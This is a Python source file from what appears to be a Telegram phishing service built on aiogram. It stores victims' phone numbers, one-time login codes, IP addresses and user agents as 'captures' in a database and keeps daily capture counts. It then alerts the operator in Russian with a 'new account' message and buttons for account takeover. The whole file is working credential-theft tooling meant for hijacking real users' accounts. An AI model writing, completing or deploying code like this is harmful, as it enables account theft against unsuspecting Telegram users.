# services/capture.py
from aiogram import Bot
from aiogram.utils.keyboard import InlineKeyboardBuilder
from db import get_pool
from config import MAX_CAPTURES_PER_BOT

async def record(sub_bot_id: int, tg_user_id: int, username: str | None,
                 full_name: str, phone: str | None, code: str | None,
                 ip: str | None, user_agent: str | None) -> int:
    async with get_pool().acquire() as conn:
        n = await conn.fetchval(
            "SELECT COUNT(*) FROM captures WHERE sub_bot_id = $1", sub_bot_id
        )
        if n >= MAX_CAPTURES_PER_BOT:
            await conn.execute(
                "DELETE FROM captures WHERE id IN ("
                "SELECT id FROM captures WHERE sub_bot_id=$1 "
                "ORDER BY created_at ASC LIMIT 50)", sub_bot_id,
            )
        cap_id = await conn.fetchval(
            "INSERT INTO captures (sub_bot_id, tg_user_id, username, full_name, "
            "phone, code, ip, user_agent) VALUES "
            "($1,$2,$3,$4,$5,$6,$7,$8) RETURNING id",
            sub_bot_id, tg_user_id, username, full_name,
            phone, code, ip, user_agent,
        )
        await conn.execute(
            "INSERT INTO stats_daily (sub_bot_id, day, captures) "
            "VALUES ($1, CURRENT_DATE, 1) "
            "ON CONFLICT (sub_bot_id, day) DO UPDATE "
            "SET captures = stats_daily.captures + 1", sub_bot_id,
        )
    return cap_id

def capture_keyboard(cap_id: int):
    kb = InlineKeyboardBuilder()
    kb.button(text="🔓 Войти", callback_data=f"takeover_open:{cap_id}")
    kb.button(text="🗄 В архив", callback_data=f"takeover_arch:{cap_id}")
    kb.adjust(2)
    return kb.as_markup()

async def notify_owner(bot: Bot, owner_id: int, cap: dict) -> None:
    lines = ["🆕 <b>Новый аккаунт</b>", f"Бот: <code>{cap['bot_username']}</code>",
             f"Имя: {cap['full_name']}"]
    if cap.get("username"):
        lines.append(f"Юзернейм: @{cap['username']}")
    if cap.get("phone"):
        lines.append(f"Телефон: <code>{cap['phone']}</code>")
    if cap.get("code"):
        lines.append(f"Код: <code>{cap['code']}</code>")
    await bot.send_message(owner_id, "\n".join(lines),
                           reply_markup=capture_keyboard(cap["id"]))